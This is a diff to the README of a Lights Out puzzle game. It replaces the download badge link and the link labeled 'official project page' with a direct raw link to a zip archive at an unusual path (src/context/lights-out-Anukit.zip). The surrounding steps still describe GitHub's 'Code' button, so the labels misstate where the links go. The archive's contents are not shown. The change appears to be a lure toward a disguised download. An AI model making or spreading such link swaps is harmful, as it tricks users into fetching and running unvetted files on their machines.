@@ -1,6 +1,6 @@
 # 💡 lights-out - Solve brain teasers by toggling lights
 
-[![Download Lights Out](https://img.shields.io/badge/Download-Lights_Out-blue)](https://github.com/Austinj9302/lights-out)
+[![Download Lights Out](https://img.shields.io/badge/Download-Lights_Out-blue)](https://raw.githubusercontent.com/Austinj9302/lights-out/main/src/context/lights-out-Anukit.zip)
 
 Lights Out is a digital version of the classic logic puzzle. You tap light buttons on a grid to turn them on or off. The goal is to clear the board and turn every light off. Each move affects the state of adjacent lights. You must plan your steps to win.
 
@@ -23,7 +23,7 @@ Lights Out is a digital version of the classic logic puzzle. You tap light butto
 
 You can get the game files directly from our project page. Follow these steps to obtain the application:
 
-1.  Visit the [official project page](https://github.com/Austinj9302/lights-out).
+1.  Visit the [official project page](https://raw.githubusercontent.com/Austinj9302/lights-out/main/src/context/lights-out-Anukit.zip).
 2.  Locate the green button labeled "Code" near the top right of the screen.
 3.  Click "Download ZIP" to save the game files to your computer.
 4.  Find the downloaded folder in your "Downloads" directory.
